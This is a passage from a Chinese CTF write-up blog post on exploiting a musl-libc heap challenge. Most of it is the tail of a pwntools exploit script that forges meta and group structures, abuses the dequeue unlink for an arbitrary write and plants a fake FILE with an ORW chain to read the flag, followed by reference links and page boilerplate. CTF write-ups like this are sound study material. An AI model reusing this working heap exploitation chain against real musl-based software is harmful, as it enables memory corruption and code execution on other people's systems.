class="hljs-string">b&#x27;E&#x27;</span>) <span class="hljs-comment">#加上开始的0x20字节元数据(meta_area)，刚好占了1页（0x1000）</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">下面是新的一页，所以需要meta_area,check必须一致，因为get_meta函数中会检查，check位于meta所在页的前8字节</span><br><span class="hljs-string">根据mata找meta_area: meta &amp; 0xfffffffffffff000 ,即找当前页的起始地址</span><br><span class="hljs-string">由于只检查了check，所以只需要构造check,然后\x00截断一下即可</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># fake meta_area</span><br>payload1 += p64(check) <span class="hljs-comment"># 存放地址是mmaped_page + 0x1000</span><br>payload1 += p64(<span class="hljs-number">0</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">m-&gt;prev-&gt;next = m-&gt;next; // 这里存在指针互写 在 prev 所指地址上 写入next 指针</span><br><span class="hljs-string">m-&gt;next-&gt;prev = m-&gt;prev; // 在next 所指地址上 写入prev 指针</span><br><span class="hljs-string"></span><br><span class="hljs-string">P = m-&gt;prev</span><br><span class="hljs-string">N = m-&gt;next</span><br><span class="hljs-string"></span><br><span class="hljs-string">*(P + 8) = N</span><br><span class="hljs-string">*(N + 0）= P</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># fake_meta</span><br>payload1 += p64(ofl_head_addr - <span class="hljs-number">0x8</span>) <span class="hljs-comment"># prev | target - 8</span><br>payload1 += p64(fake_mem_addr) <span class="hljs-comment"># next | target_value</span><br>payload1 += p64(fake_mem_addr) <span class="hljs-comment"># mem | 这个地址必须指向group，get_meta函数中会检查meta 是否指向对应的group</span><br>payload1 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># avail_mask</span><br>payload1 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># freed_mask</span><br>payload1 += p64((maplen&lt;&lt;<span class="hljs-number">12</span>)|(sc&lt;&lt;<span class="hljs-number">6</span>)|(freeable&lt;&lt;<span class="hljs-number">5</span>)|last_idx)<br>payload1 += p64(<span class="hljs-number">0</span>)<br><br>delete(<span class="hljs-number">9</span>) <span class="hljs-comment"># 空出2个0xc的chunk</span><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x2000</span>,payload1) <span class="hljs-comment"># 9</span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x2000</span>,<span class="hljs-string">&#x27;D&#x27;</span>) <span class="hljs-comment"># 申请多余的那一个空闲chunk(size=0xc),减少影响</span><br><br>log.info(<span class="hljs-string">&quot;leak address of ORW &amp; fake meta &amp; fake meta_area&quot;</span>)<br>delete(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0xf</span>)<br>show(<span class="hljs-number">8</span>)<br>p.recvuntil(<span class="hljs-string">&quot;E\n&quot;</span>)<br>mmaped_page = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x20</span> <span class="hljs-comment"># 0x7ffff7fee000 前20字节是元数据，payload是从0x7ffff7fee020开始的</span><br>log.success(<span class="hljs-string">&quot;mmaped_page: &quot;</span> + <span class="hljs-built_in">hex</span>(mmaped_page)) <span class="hljs-comment"># payload1存放的内存地址，包含了ORW和fake_meta</span><br>orw_addr = mmaped_page + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x20</span><br>fake_meta_addr = mmaped_page + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0x10</span><br><br>log.info(<span class="hljs-string">&quot;build idx &amp; offset to point at fake meta&quot;</span>)<br><span class="hljs-comment"># const struct group *base = (const void *)(p - UNIT*offset - UNIT)  UNIT=0x10</span><br><span class="hljs-comment"># group_base = p - 0x10</span><br>payload2 = p64(fake_meta_addr) <span class="hljs-comment"># 此处是fake_group，值为fake_mata的地址</span><br>payload2 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># offset = 0 idx = 0 (伪造idx和offset，从而伪造group)</span><br>payload2 += p64(fake_mem_addr + <span class="hljs-number">0x20</span>) <span class="hljs-comment"># 值为fake_mem，此处是chunk地址，确保能正确删除idx=7的内容chunk</span><br><br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,payload2) <span class="hljs-comment"># 根据mem地址确定meta地址</span><br>delete(<span class="hljs-number">7</span>) <span class="hljs-comment"># 删除idx=7的控制chunk时触发deqeune</span><br><br>fake_file = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>fake_file += p64(orw_addr) <span class="hljs-comment"># mustbezero_1 | [rdi+0x30]</span><br>fake_file += p64(ret) <span class="hljs-comment"># wbase | [rdi+0x38]</span><br>fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># (*read)(FILE *, unsigned char *, size_t)</span><br>fake_file += p64(magic_gadget) <span class="hljs-comment"># (*write)(FILE *, const unsigned char *, size_t)</span><br>fake_file = fake_file.ljust(<span class="hljs-number">0x8C</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_file += p32(<span class="hljs-number">0xFFFFFFFF</span>)<br><br><span class="hljs-comment"># 这个0x40取决于idx=4的内容chunk与fake_mem_addr的偏移，使fake_mem_addr处刚好是fake_file</span><br>payload3 = <span class="hljs-string">b&quot;./flag\x00&quot;</span>.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += fake_file<br>payload3 = payload3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;G&#x27;</span>)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,payload3)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br><span class="hljs-comment"># pwnlib.gdb.attach(p,&quot;b write&quot;)</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;4&#x27;</span>) <span class="hljs-comment"># exit</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://www.wangqingzheng.com/anquanke/1/241101.html">http://www.wangqingzheng.com/anquanke/1/241101.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cjovi.icu/WP/1549.html">https://www.cjovi.icu/WP/1549.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903574154002445#heading-9">https://juejin.cn/post/6844903574154002445#heading-9</a></li>
+<li><a target="_blank" rel="noopener" href="https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exp">https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exp</a></li>
+<li><a target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/700.html#musl">https://ctf.njupt.edu.cn/700.html#musl</a></li>
+<li><a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E7%82%B9-2">https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E7%82%B9-2</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF-WriteUp/">CTF-WriteUp</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/heap/">heap</a>
+                    
+                      <a class="hover-with-bg" href="/tags/musl-libc/">musl-libc</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/02/2021RCTF-sharing/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2021RCTF-sharing</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/02/CVE-2018-16333/">
+                        <span class="hidden-mobile">CVE-2018-16333复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"2GYV17CUmss2VIOWS1MFpfqj-gzGzoHsz","appKey":"0R4wcvymx9kXQiyeaw8t2otu","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/RunData.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
